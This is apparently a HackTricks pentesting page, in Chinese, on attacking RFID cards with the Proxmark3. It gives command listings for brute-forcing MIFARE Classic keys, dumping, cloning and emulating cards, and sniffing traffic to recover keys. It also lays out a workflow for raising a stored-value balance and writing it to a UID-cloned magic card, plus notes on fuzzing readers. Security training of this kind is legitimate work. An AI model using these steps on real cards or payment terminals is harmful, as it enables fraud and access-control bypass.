# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## 使用 Proxmark3 攻击 RFID 系统

安装积极维护的 RRG/Iceman Proxmark3 客户端及匹配的固件，然后根据该版本确认命令语法，因为下方列出的旧命令可能已发生变化。<sup>[[1]](#references)[[5]](#references)</sup>

### 攻击 MIFARE Classic 1KB

MIFARE Classic 1K 有 **16 个扇区**，每个扇区包含 **4 个块**，每块 **16 字节**。制造商块 0 包含 UID/制造商数据，在原装 NXP 卡上为只读；特殊克隆卡或“magic”卡可能允许重写该块。<sup>[[1]](#references)[[2]](#references)</sup>\
要访问每个扇区，需要 **2 个密钥**（**A** 和 **B**），它们存储在**每个扇区的块 3** 中（扇区尾块）。扇区尾块还存储**访问位**，用于设定使用这两个密钥对**每个块**的**读写**权限。\
例如，如果你知道第一个密钥，可用它授予读取权限；如果知道第二个密钥，则可用它授予写入权限。

可以执行多种攻击。

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 还允许执行其他操作，例如**窃听** **Tag 到 Reader 的通信**，尝试获取敏感数据。对于这张卡，你只需嗅探通信并计算所用密钥，因为使用的**加密操作很弱**，只要知道明文和密文，就能计算出密钥（`mfkey64` 工具）。<sup>[[3]](#references)</sup>

#### MiFare Classic 储值滥用快速工作流

当终端将余额存储在 Classic 卡上时，典型的端到端流程如下：<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

说明

- `hf mf autopwn` 可编排 nested/darkside/HardNested 风格的攻击、恢复密钥，并在客户端 dumps 文件夹中创建转储文件。<sup>[[1]](#references)</sup>
- 只有 magic gen1a/gen2 卡才能写入 block 0/UID。普通 Classic 卡的 UID 为只读。<sup>[[2]](#references)</sup>
- 许多部署会使用 Classic“值块”或简单校验和。编辑后，请确保所有重复/取反字段和校验和保持一致。<sup>[[4]](#references)</sup>

有关更高层级的方法和缓解措施，请参阅：

{{#ref}}
pentesting-rfid.md
{{#endref}}

### 原始命令

IoT 系统有时会使用**非品牌或非商用标签**。在这种情况下，可以使用 Proxmark3 向**标签发送自定义原始命令**。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

有了这些信息，你可以尝试搜索有关该卡片及其通信方式的信息。Proxmark3 可以发送原始命令，例如：`hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 软件预装了一系列**自动化脚本**，可用于执行简单任务。要获取完整列表，请使用 `script list` 命令。接下来，使用 `script run` 命令，后跟脚本名称：

```
proxmark3> script run mfkeys
```

你可以创建一个脚本来 **fuzz tag readers**：复制一张**有效卡**的数据，然后只需编写一个 **Lua script**，随机修改一个或多个**字节**，并检查每次迭代是否会导致**读卡器崩溃**。

## References

- [1] [Proxmark3 wiki：HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki：HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP 关于 MIFARE Classic Crypto1 的声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft 储值系统中的 NFC 卡漏洞利用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux 安装指南](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
